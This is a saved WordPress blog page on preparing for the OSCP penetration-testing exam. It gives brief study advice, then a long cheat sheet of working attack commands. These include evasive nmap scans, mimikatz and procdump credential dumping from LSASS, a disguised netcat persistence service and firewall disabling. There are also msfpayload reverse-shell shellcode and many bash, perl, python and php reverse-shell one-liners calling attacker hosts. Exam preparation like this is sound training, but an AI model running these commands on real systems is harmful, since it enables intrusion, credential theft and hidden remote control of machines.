a[href^="http://galleries.securewebsiteaccess.com/"], :root a[href^=" http://n47adshostnet.com/"], :root a[href^="http://linksnappy.com/?ref="], :root #main_col > #center_col div[style="font-size:14px;margin:0 4px;padding:1px 5px;background:#fff7ed"], :root [id*="MGWrap"], :root a[href^="http://adtrack123.pl/"], :root .section-result[data-result-ad-type], :root script[src^="http://free-shoutbox.net/app/webroot/shoutbox/sb.php?shoutbox="] + #freeshoutbox_content, :root a[href^=" http://ads.ad-center.com/"], :root a[href="http://track.freemmo2017.com/"], :root .GPMV2XEDA2 > .GPMV2XEDP1 > .GPMV2XEDJBB, :root a[href*="onclkds."], :root a[href^="http://a.adquantix.com/"], :root a[href^="http://srvpub.com/"], :root div[id^="dfp-slot-"], :root .l-container > #fishtank, :root a[href^="//go.vedohd.org/"], :root a[href^="https://fileboom.me/pr/"], :root a[href^="http://marketgid.com"], :root a[href*="pussl3.com"], :root div[itemtype="http://www.schema.org/WPAdBlock"], :root .__zinit .__y_item, :root .ch[onclick="ga(this,event)"], :root a[href^="https://ad.doubleclick.net/"], :root a[href*="letsadvertisetogether.com"], :root a[href^="http://data.linoleictanzaniatitanic.com/"], :root a[href*="=exoclick"], :root a[href*="=adscript"], :root #mn #center_col > div > h2.spon:first-child, :root a[href*="=Adtracker"], :root .ra[align="right"][width="30%"], :root a[href*="5iclx7wa4q.com"], :root a[href^="https://www.popads.net/users/"], :root a[href^="http://tracking.crazylead.com/"], :root a[href*="/cmd.php?ad="], :root #ads > .dose > .dosesingle, :root a[href^="//bwnjijl7w.com/"], :root a[href*=".revimedia.com/"], :root a[href^="http://fsoft4down.com/"], :root a[href*="ad2upapp.com/"], :root .plista_widget_belowArticleRelaunch_item[data-type="pet"], :root a[href*=".adsrv.eacdn.com/"] > img, :root a[href^="http://lp.ilivid.com/"], :root a[href*=".inclk.com/"], :root a[href*=".ichlnk.com/"], :root a[href^="http://api.content.ad/"], :root a[href^="http://galleries.pinballpublishernetwork.com/"], :root .ob_dual_right > .ob_ads_header ~ .odb_div, :root a[href*=".adk2x.com/"], :root #\5f _admvnlb_modal_container, :root a[href^="http://www.firstload.com/affiliate/"], :root a[href^="http://duckcash.eu/"], :root a[href^="http://www.mobileandinternetadvertising.com/"], :root a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"], :root a[data-url^="http://paid.outbrain.com/network/redir?"] + .author, :root a[href^="http://www.my-dirty-hobby.com/?sub="], :root a[href^="http://liversely.net/"], :root a[href^="http://www.bet365.com/"][href*="?affiliate="], :root a[data-redirect^="https://paid.outbrain.com/network/redir?"], :root a[href^="http://www.twinplan.com/AF_"], :root a[href^="http://n.admagnet.net/"], :root a[href^="http://connectlinking6.com/"], :root a[data-obtrack^="http://paid.outbrain.com/network/redir?"], :root a[href^="//www.mgid.com/"], :root div[id^="ad-div-"], :root #center_col > div[style="font-size:14px;margin-right:0;min-height:5px"] > div[style="font-size:14px;margin:0 4px;padding:1px 5px;background:#fff8e7"], :root .__y_inner > .__y_item, :root AMP-AD, :root .jobs-information-call-to-action + .jobs-information-call-to-action div[class$="_item"], :root .trc_rbox_div .syndicatedItem, :root a[href^="http://go.ad2up.com/"], :root [id*="MarketGid"], :root div[class^="lifeOnwerAd"], :root a[data-oburl^="http://paid.outbrain.com/network/redir?"], :root .widget-pane-section-result[data-result-ad-type], :root #center_col > #main > .dfrd > .mnr-c > .c._oc._zs, :root .trc_rbox_div .syndicatedItemUB, :root .trc_rbox .syndicatedItem, :root a[href^="http://pwrads.net/"], :root div[class^="adpubs-"], :root #mn div[style="position:relative"] > #center_col > div > ._dPg, :root .rhsvw[style="background-color:#fff;margin:0 0 14px;padding-bottom:1px;padding-top:1px;"], :root a[href^="http://www.pinkvisualpad.com/?revid="], :root a[href^="//porngames.adult/?SID="], :root #main-content > [style="padding:10px 0 0 0 !important;"], :root a[href^="http://www.webtrackerplus.com/"], :root .GJJKPX2N1 > .GJJKPX2M1 > .GJJKPX2P4, :root a[href^="http://centertrust.xyz/"], :root .ob_container .item-container-obpd, :root a[href^="http://ad.au.doubleclick.net/"], :root a[href^="https://intrev.co/"], :root a[href^="http://record.sportsbetaffiliates.com.au/"], :root #topstuff > #tads, :root a[href^="https://porndeals.com/?track="], :root a[href^="http://www.1clickmoviedownloader.info/"], :root .mw > #rcnt > #center_col > #taw > #tvcap > .c, :root #mn #center_col > div > h2.spon:first-child + ol:last-child, :root .plistaList > .plista_widget_underArticle_item[data-type="pet"], :root a[href*="a2g-secure.com"], :root a[href^="http://adultfriendfinder.com/p/register.cgi?pid="], :root a[href^="http://www.yourfuckbook.com/?"], :root a[href^="http://ads.sprintrade.com/"], :root .GHOFUQ5BG2 > .GHOFUQ5BF2 > .GHOFUQ5BG5, :root a[href^="http://www.richducks.com/"], :root a[href^="http://www.babylon.com/welcome/index?affID"], :root a[href^="http://ad-apac.doubleclick.net/"], :root .gbfwa > div[class$="_item"], :root a[href^="http://prochina.space/"], :root a[href^="http://www.freefilesdownloader.com/"], :root a[href^="http://ul.to/ref/"], :root a[href^="http://www.uniblue.com/cm/"], :root a[data-redirect^="http://click.plista.com/pets"], :root #rhs_block > script + .c._oc._Ve.rhsvw, :root .rscontainer > .ellip, :root .plistaList > .itemLinkPET, :root a[href^="http://mgid.com/"], :root a[data-redirect^="this.href='http://paid.outbrain.com/network/redir?"], :root a[href^="http://track.incognitovpn.com/"], :root a[href^="http://click.guamwnvgashbkashawhgkhahshmashcas.pw/"], :root a[href^="http://stateresolver.link/"], :root .__ywl .__y_item, :root a[href*=".clksite.com/"], :root #center_col > #resultStats + #tads, :root .__yinit .__y_item, :root a[href^="http://adlev.neodatagroup.com/"], :root .ra[align="left"][width="30%"], :root a[href^="https://trackjs.com/?utm_source"], :root AFS-AD, :root a[href^="http://server.cpmstar.com/click.aspx?poolid="], :root #cnt #center_col > #res > #topstuff > .ts, :root #cnt #center_col > #taw > #tvcap > .c._oc._Lp, :root .trc_rbox_div a[target="_blank"][href^="http://tab"], :root .GKJYXHBF2 > .GKJYXHBE2 > .GKJYXHBH5, :root #rhs_block .mod > .gws-local-hotels__booking-module, :root a[href*="googleme.eu"], :root .mod > ._jH + .rscontainer, :root .GFYY1SVD2 > .GFYY1SVC2 > .GFYY1SVF5, :root a[href^="https://dcs.adgear.com/clicks/"], :root a[data-oburl^="https://paid.outbrain.com/network/redir?"], :root a[href^="http://affiliates.score-affiliates.com/"], :root ADS-RIGHT, :root a[href^="http://www.accuserveadsystem.com/accuserve-go.php?"], :root a[href^="http://c.ketads.com/"], :root a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"], :root #tads + div + .c, :root a[href^="https://betway.com/"][href*="&a="], :root a[href^="http://rekoverr.com/"], :root #rhswrapper > #rhssection[border="0"][bgcolor="#ffffff"], :root .Mpopup + #Mad > #MadZone, :root a[href^="http://www.TwinPlan.com/AF_"], :root a[href^="http://landingpagegenius.com/"], :root a[href^="http://www.streamtunerhd.com/signup?"], :root #ssmiwdiv[jsdisplay], :root a[href^="http://paid.outbrain.com/network/redir?"], :root a[href^="http://easydownload4you.com/"], :root #rhs_block > #mbEnd, :root #center_col > #\5f Emc, :root a[href^="http://papi.mynativeplatform.com:80/pub2/"], :root div[id^="dfp-ad-"], :root .GB3L-QEDGY .GB3L-QEDF- > .GB3L-QEDE-, :root #rhs_block .mod > .luhb-div > div[data-async-type="updateHotelBookingModule"], :root input[onclick^="window.open('http://www.FriendlyDuck.com/"], :root a[href^="//z6naousb.com/"], :root .rc-cta[data-target], :root a[href^="http://hd-plugins.com/download/"], :root #rhs_block > .ts[cellspacing="0"][cellpadding="0"][style="padding:0"], :root .GFYY1SVE2 > .GFYY1SVD2 > .GFYY1SVG5, :root a[href^="http://tracker.mybroadband.co.za/"], :root #flowplayer > div[style="position: absolute; width: 300px; height: 275px; left: 222.5px; top: 85px; z-index: 999;"], :root a[href^="http://cwcams.com/landing/click/"], :root .nrelate .nr_partner, :root a[href^="http://www.adxpansion.com"], :root a[href^="http://wgpartner.com/"], :root #center_col > #resultStats + #tads + #res + #tads, :root .trc_related_container div[data-item-syndicated="true"], :root a[href^="http://t.mdn2015x1.com/"], :root .trc_rbox_border_elm .syndicatedItem, :root a[href^="http://dwn.pushtraffic.net/"], :root a[href$="/vghd.shtml"], :root a[href^="//medleyads.com/spot/"], :root #rhs_block > ol > .rhsvw > .kp-blk > .xpdopen > ._OKe > ol > ._DJe > .luhb-div, :root #center_col > #res > #topstuff + #search > div > #ires > #rso > #flun, :root #resultspanel > #topads, :root p[id^="div-gpt-ad-"], :root #assetsListings[style="display: block;"], :root #header + #content > #left > #rlblock_left, :root a[href*="emprestimo.eu"] { display: none !important; }</style><link rel="stylesheet" type="text/css" id="gravatar-card-css" href="./OSCP – My preparation for challenge_files/hovercard.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="./OSCP – My preparation for challenge_files/services.css"><script type="text/javascript" async="" src="./OSCP – My preparation for challenge_files/saved_resource(4)"></script><script type="text/javascript" async="" src="./OSCP – My preparation for challenge_files/saved_resource(5)"></script></head>
+
+<body class="home page-template-default page page-id-4 wp-custom-logo mp6 customizer-styles-applied not-multi-author display-header-text comments-closed highlander-enabled highlander-light">
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="https://arjunjaiswal2k18.wordpress.com/#content">Skip to content</a>
+
+	<header id="masthead" class="site-header" role="banner">
+
+		
+				<div class="site-branding">
+			<a href="https://arjunjaiswal2k18.wordpress.com/" class="custom-logo-link" rel="home" itemprop="url"><img width="939" height="290" src="./OSCP – My preparation for challenge_files/cropped-1_34gcma82filxcwqhhq4a6g11.png" class="custom-logo" alt="OSCP – My preparation for challenge" itemprop="logo" srcset="https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png 939w, https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png?w=150&amp;h=46 150w, https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png?w=300&amp;h=93 300w, https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png?w=768&amp;h=237 768w" sizes="(max-width: 939px) 100vw, 939px" data-attachment-id="21" data-permalink="https://arjunjaiswal2k18.wordpress.com/cropped-1_34gcma82filxcwqhhq4a6g11-png/" data-orig-file="https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png" data-orig-size="939,290" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped-1_34gcma82filxcwqhhq4a6g11.png" data-image-description="&lt;p&gt;https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png&lt;/p&gt;
+" data-medium-file="https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png?w=300" data-large-file="https://arjunjaiswal2k18.files.wordpress.com/2018/05/cropped-1_34gcma82filxcwqhhq4a6g11.png?w=939"></a>							<p class="site-title"><a href="https://arjunjaiswal2k18.wordpress.com/" rel="home">OSCP – My preparation for challenge</a></p>
+			
+					</div><!-- .site-branding -->
+
+		<nav id="site-navigation" class="main-navigation" role="navigation">
+	<button class="menu-toggle" aria-controls="top-menu" aria-expanded="false">Menu</button>
+	<div class="menu-primary-container"><ul id="top-menu" class="menu nav-menu" aria-expanded="false"><li id="menu-item-11" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-4 current_page_item menu-item-11"><a href="https://arjunjaiswal2k18.wordpress.com/">OSCP Challenge</a></li>
+<li id="menu-item-10" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10"><a href="https://arjunjaiswal2k18.wordpress.com/contact/">Contact</a></li>
+</ul></div>	</nav>
+
+	</header>
+
+	
+<div id="featured-content" class="flexslider hero">
+	<div class="flex-viewport-wrapper hero-content" style="height: 180px;">
+		<div class="featured-posts slides" id="featured-slides">
+						<div class="hero-content-wrapper" style="width: 100%; float: left; margin-right: -100%; position: relative; opacity: 1; display: block; transition: opacity 0.6s ease; z-index: 2;">
+					<a href="https://arjunjaiswal2k18.wordpress.com/2018/05/15/the-journey-begins/" title="About me">
+													<div class="thumbnail-placeholder"></div>
+											</a>
+					<div class="featured-post">
+																			<a href="https://arjunjaiswal2k18.wordpress.com/2018/05/15/the-journey-begins/"><h2 class="entry-title">About me</h2></a>
+														<div class="entry-meta">
+			<span class="posted-on"><a href="https://arjunjaiswal2k18.wordpress.com/2018/05/15/the-journey-begins/" rel="bookmark"><time class="entry-date published" datetime="2018-05-15T03:48:07+00:00">May 15, 2018</time><time class="updated" datetime="2018-05-30T05:29:34+00:00">May 30, 2018</time></a></span><span class="byline"> <span class="author vcard"><a class="url fn n" href="https://arjunjaiswal2k18.wordpress.com/author/arjunjaiswal2k18/">Security Ninja</a></span></span>		</div><!-- .entry-meta -->					</div><!-- .featured-post -->
+				</div>
+				</div><!-- .slides -->
+	</div><!-- .hero-content -->
+</div><!-- .hero -->
+
+	<div id="content" class="site-content">
+
+	<div id="primary" class="content-area front-page-content-area">
+					
+<article id="post-4" class="post-4 page type-page status-publish hentry without-featured-image">
+	<header class="entry-header">
+		<h1 class="entry-title">OSCP Challenge</h1>	</header>
+		<div class="entry-content">
+			<p>I will not go into background and waste time and would rather come straight to the point. OSCP preparation takes hard work and consistent efforts. The OSCP exam challenge involves exploiting five main machines. Each machine will have different marking depending upon the difficulty level of compromising it. The main aspects of the exam are –</p>
+<ul>
+<li>24-hour exam with available lab machines carrying different marks.</li>
+<li>A PDF report of the exam as in how did you compromise the host. What were the steps taken? Vulnerabilities exploited. etc.</li>
+<li>A PDF report of the lab machines, which you exploited while preparing for the OSCP challenge. This will award you bonus 10 marks.</li>
+<li>A try harder approach.</li>
+</ul>
+<p><strong>Preliminary preparation – Ground Zero</strong></p>
+<p>OSCP course itself is vast and wholesome for a person to impart skills required for a penetration tester or ethical hacker. The concepts involve lot of base build up when it comes to different concepts such as assembly language, python and Linux.</p>
+<p>Before starting with the actual course I suggest you should start 2 months in advance and get yourself familiar with following available resources to get hands-on assembly language, python and Linux: –</p>
+<p>I cannot stress enough for having a basic background before appearing for a wholesome exam like OSCP. In my view, a person should be familiar with following areas before attempting the exam: –</p>
+<ul>
+<li><strong>Basic knowledge of Linux&nbsp;commands and OS&nbsp;</strong>–&nbsp;According to me this is the basic step in starting your OSCP labs. A person should have basic knowledge and understanding of Linux command line especially basic OS level commands.</li>
+<li><strong>Knowledge on Linux&nbsp;and assembly language&nbsp;&nbsp;</strong> – This is an essential step in OSCP because it helps with problem like buffer overflow during the OSCP challenge. For this, I would recommend to go back to the basics and watch all related video tutorials. The ones, which I referred to, were&nbsp;–&nbsp;<span class="skimlinks-unlinked">https://youtu.be/K0g-twyhmQ4</span> (Assembly Primer for Hackers (Part 1) System Organization),&nbsp;<span class="skimlinks-unlinked">https://www.youtube.com/watch?v=RF7DF4kfs1E</span> (Buffer Overflow Primer Part 1 (Smashing the Stack)), and windows assembly language mega primer.</li>
+<li><strong>Security background –&nbsp;</strong>It is essential that one should have a good information security background. I would recommend if you are, a fresher do not approach OSCP course. At least take 3-4 years of beginner level experience before taking up the lab course. A person should have basic networking knowledge, and of commonly used tools such as Nmap, Tcpdump, Wireshark etc.</li>
+<li><strong>Practice some hacking&nbsp;</strong>– I did not do this part because I realized this after I took OSCP lab course. You can go and practice some hacking free of cost from commonly available websites such as –&nbsp;<span class="skimlinks-unlinked">https://www.vulnhub.com</span>/,&nbsp;<span class="skimlinks-unlinked">https://www.hackthis.co.uk</span>/,&nbsp;<span class="skimlinks-unlinked">https://www.hackthissite.org</span>/ etc.</li>
+</ul>
+<p><strong>Course guidelines</strong></p>
+<p>OSCP course mainly comprises of 300 page of PDF and video tutorial from Offensive Security. According to me, these are more than enough to build fundamental knowledge for pen testing with Kali. They give you enough details of using tools such as NMAP, Netcat, Sqlmap etc., which are essential tools for any kind of enumeration and exploitation.</p>
+<p>Apart from this, I would recommend following links and cheat sheet, which came handy while I was practicing in the lab environment using different tools. You can refer to these links and I would suggest place it in your notes. I would also be discussing note-taking strategy in my next section.</p>
+<p>&nbsp;</p>
+<pre><strong>Nmap Full Web Vulnerable Scan: </strong>
+ mkdir /usr/share/nmap/scripts/vulscan
+ cd /usr/share/nmap/scripts/vulscan
+
+Wget <span class="skimlinks-unlinked">http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz</span> &amp;&amp; tar xzf nmap_nse_vulscan-2.0.<span class="skimlinks-unlinked">tar.gz</span>
+
+nmap -sS -sV –script=vulscan/<span class="skimlinks-unlinked">vulscan.nse</span> target
+ nmap -sS -sV –script=vulscan/<span class="skimlinks-unlinked">vulscan.nse</span> –script-args vulscandb=<span class="skimlinks-unlinked">scipvuldb.csv</span> target
+ nmap -sS -sV –script=vulscan/<span class="skimlinks-unlinked">vulscan.nse</span> –script-args vulscandb=<span class="skimlinks-unlinked">scipvuldb.csv</span> -p80 target
+ nmap -PN -sS -sV –script=vulscan –script-args vulscancorrelation=1 -p80 target
+ nmap -sV –script=vuln target
+ nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target</pre>
+<pre><strong>Dirb Directory Bruteforce:</strong>
+ dirb http://IP:PORT dirbuster-ng-master/wordlists/<span class="skimlinks-unlinked">common.txt</span>
+ <strong>Nikto Scanner:</strong>
+ nikto -C all -h http://IP
+ <strong>WordPress Scanner:</strong>
+ wpscan –url http://IP/ –enumerate p
+ <strong>Uniscan Scanning:</strong>
+ <span class="skimlinks-unlinked">uniscan.pl</span> -u target -qweds
+ <strong>HTTP Enumeration:</strong>
+ httprint -h <span class="skimlinks-unlinked">http://www.example.com</span> -s <span class="skimlinks-unlinked">signatures.txt</span>
+ <strong>Nmap Ports Scan:</strong>
+ 1)decoy- masquerade nmap -D RND:10 [target] (Generates a random number of decoys)
+ 1)decoy- masquerade nmap -D RND:10 [target] (Generates a random number of decoys)
+ 2)fragment
+ 3)data packed – like original one not scan packet
+ 4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target
+ 5)nmap –source-port 53 target
+ nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
+ nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
+ nmap –script <span class="skimlinks-unlinked">smb-check-vulns.nse</span> -p445 target (using NSE scripts)
+ nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
+ nmap -sA -PN -sN target
+ nmap -sS -sV -T5 -F -A -O target (version detection)
+ nmap -sU -v target (Udp)
+ nmap -sU -P0 (Udp)
+ nmap -sC 192.168.31.10-12 (all scan default)
+ <strong>Netcat Scanning:</strong>
+ nc -v -w 1 target -z 1-1000
+ for i in {10..12}; do nc -vv -n -w 1 192.168.34.$i 21-25 -z; done
+ <strong>Unicornscan Scanning:</strong>
+ unicornscan X.X.X.X:a -r10000 -v</pre>
+<pre><strong>Samba Enumeration:</strong>
+ nmblookup -A target
+ smbclient //MOUNT/share -I target -N
+ recipient -U “” target
+ enum4linux target
+ <strong>SNMP Enumeration:</strong>
+ snmpget -v 1 -c public IP version
+ snmpwalk -v 1 -c public IP
+ snmpbulkwalk -v 2 -c public IP
+ <strong>Windows Useful commands:</strong>
+ net localgroup Users
+ net localgroup Administrators
+ search dir/s *.doc
+ system(“start <span class="skimlinks-unlinked">cmd.exe</span> /k $cmd”)
+ sc create microsoft_update binpath=”cmd /K start c:\<span class="skimlinks-unlinked">nc.exe</span> -d ip-of-hacker port -e <span class="skimlinks-unlinked">cmd.exe</span>” start= auto error= ignore
+ /c C:\<span class="skimlinks-unlinked">nc.exe</span> -e c:\windows\system32\<span class="skimlinks-unlinked">cmd.exe</span> -vv 23.92.17.103 7779
+ <span class="skimlinks-unlinked">mimikatz.exe</span> “privilege::debug” “log” “sekurlsa::logonpasswords”
+ <span class="skimlinks-unlinked">Procdump.exe</span> -accepteula -ma <span class="skimlinks-unlinked">lsass.exe</span> <span class="skimlinks-unlinked">lsass.dmp</span>
+ <span class="skimlinks-unlinked">mimikatz.exe</span> “sekurlsa::minidump <span class="skimlinks-unlinked">lsass.dmp</span>” “log” “sekurlsa::logonpasswords”
+ C:\temp\<span class="skimlinks-unlinked">procdump.exe</span> -accepteula -ma <span class="skimlinks-unlinked">lsass.exe</span> <span class="skimlinks-unlinked">lsass.dmp</span> For 32 bits
+ C:\temp\<span class="skimlinks-unlinked">procdump.exe</span> -accepteula -64 -ma <span class="skimlinks-unlinked">lsass.exe</span> <span class="skimlinks-unlinked">lsass.dmp</span> For 64 bits
+ <strong>Plink Tunnel: </strong>
+ <span class="skimlinks-unlinked">plink.exe</span> -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 X.X.X.X</pre>
+<pre><strong>Enable RDP Access: </strong>
+ reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
+ netsh firewall set service remoteadmin enable
+ netsh firewall set service remotedesktop enable
+ <strong>Turn Off Firewall: </strong>
+ netsh firewall set opmode disable
+ <strong>Meterpreter:</strong>
+ run getgui -u admin -p 1234
+ run vnc -p 5043
+ Add User Windows:
+ net user test 1234 /add
+ net localgroup administrators test /add
+ Password Cracking using Hashcat:
+ hashcat -m 400 -a 0 hash /root/<span class="skimlinks-unlinked">rockyou.txt</span>
+ <strong>Netcat commands: </strong>
+ c:&gt; nc -l -p 31337
+ #nc 192.168.0.10 31337
+ c:&gt; nc -v -w 30 -p 31337 -l &lt; <span class="skimlinks-unlinked">secret.txt</span>
+ #nc -v -w 2 192.168.0.10 31337 &gt; <span class="skimlinks-unlinked">secret.txt</span>
+ <strong>Banner Grabbing:</strong>
+ nc 192.168.0.10 80
+ GET / HTTP/1.1
+ Host: 192.168.0.10
+ User-Agent: SPOOFED-BROWSER
+ Referrer: K0NSP1RACY.COM
+ &lt;enter&gt;
+ &lt;enter&gt;
+ <strong>window reverse shell:</strong>
+ c:&gt;nc -Lp 31337 -vv -e <span class="skimlinks-unlinked">cmd.exe</span>
+ nc 192.168.0.10 31337
+ c:&gt;nc rogue.k0nsp1racy.com 80 -e <span class="skimlinks-unlinked">cmd.exe</span>
+ nc -lp 80
+ #nc -lp 31337 -e /bin/bash
+ nc 192.168.0.11 31337
+ nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
+ <strong>Find all SUID root files:</strong>
+ find / -user root -perm -4000 -print
+ <strong>Find all SGID root files:</strong>
+ find / -group root -perm -2000 -print
+ <strong>Find all SUID and SGID files owned by anyone</strong>:
+ find / -perm -4000 -o -perm -2000 -print
+ <strong>Find all files that are not owned by any user:</strong>
+ find / -nouser -print
+ <strong>Find all files that are not owned by any group:</strong>
+ find / -nogroup -print
+ <strong>Find all symlinks and what they point to:</strong>
+ find / -type l -ls
+ <strong>Python:</strong>
+ python -c ‘import pty;<span class="skimlinks-unlinked">pty.spawn(“/bin/bash</span>”)’
+ python -m SimpleHTTPServer (Starting HTTP Server)
+ <strong>PID: </strong>
+ fuser -nv tcp 80 (list PID of process)
+ fuser -k -n tcp 80 (Kill Process of PID)
+ <strong>Hydra: </strong>
+ hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp (Self Explanatory)
+ <strong>Mount Remote Windows Share: </strong>
+ smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user, password=pass, rw
+ Compiling Exploit in Kali:
+ gcc -m32 -o output32 hello.c (32 bit)
+ gcc -o output hello.c (64 bit)
+ <strong>Compiling Windows Exploits on Kali: </strong>
+ cd /root/.wine/drive_c/MinGW/bin
+ wine gcc -o <span class="skimlinks-unlinked">ability.exe</span> /tmp/exploit.c -lwsock32
+ wine <span class="skimlinks-unlinked">ability.exe</span>
+ <strong>NASM Command: </strong>
+ nasm -f bin -o <span class="skimlinks-unlinked">payload.bin</span> <span class="skimlinks-unlinked">payload.asm</span>
+ nasm -f elf <span class="skimlinks-unlinked">payload.asm</span>; ld -o payload payload.o; objdump -d payload
+ <strong>Windows Buffer Overflow Exploitation Commands: </strong>
+ msfpayload windows/shell_bind_tcp R | msfencode -a x86 -b “\x00″ -t c
+ msfpayload windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 R | msfencode -e x86/shikata_ga_nai -b “\x00″ -t c</pre>
+<p><strong>Reverse Shellcode:</strong></p>
+<pre><strong>BASH:</strong>
+ bash -i &gt;&amp; /dev/tcp/192.168.23.10/443 0&gt;&amp;1
+ exec /bin/bash 0&amp;0 2&gt;&amp;0
+ exec /bin/bash 0&amp;0 2&gt;&amp;0
+ 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+ 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+ exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
+ exec 5&lt;&gt;/dev/tcp/attackerip/4444
+ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:
+ while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
+ /bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1
+ /bin/bash -i &gt; /dev/tcp/192.168.23.10/443 0&lt;&amp;1 2&gt;&amp;1
+ <strong>PERL:</strong>
+ Shorter Perl reverse shell that does not depend on /bin/sh:
+ perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’
+ perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’
+ If the target system is running Windows use the following one-liner:
+ perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’
+ perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’
+ perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’
+ perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};
+ <strong>PYTHON:</strong>
+ python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);connect((“10.0.0.1″,1234));<span class="skimlinks-unlinked">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1</span>); <span class="skimlinks-unlinked">os.dup2(s.fileno(),2);p=subprocess.call</span>([“/bin/sh”,”-i”]);’
+ python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);connect((“10.0.0.1″,1234));<span class="skimlinks-unlinked">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1</span>); <span class="skimlinks-unlinked">os.dup2(s.fileno(),2);p=subprocess.call</span>([“/bin/sh”,”-i”]);’
+ <strong>PHP:</strong>
+ This code assumes that the TCP connection uses file descriptor 3.
+ php -r ‘$sock=fsockopen(“10.0.0.1″,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3″);’
+ php -r ‘$sock=fsockopen(“10.0.0.1″,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3″);’
+ If you would like a PHP reverse shell to download, try this link on <span class="skimlinks-unlinked">pentestmonkey.net</span> -&gt; LINK
+</pre>
+<p><strong>Web shells:</strong><br>
+<a href="http://www.r57shell.net/" rel="nofollow">http://www.r57shell.net/</a></p>
+<p><strong>Linux enumeration:</strong></p>
+<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="nofollow">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
+<p><strong>Transferring files from Kali to windows: </strong><br>
+<a href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/" rel="nofollow">https://blog.ropnop.com/transferring-files-from-kali-to-windows/</a></p>
+<p><strong>Marketplace for exploits: </strong><br>
+<a href="https://0day.today/" rel="nofollow">https://0day.today/</a></p>
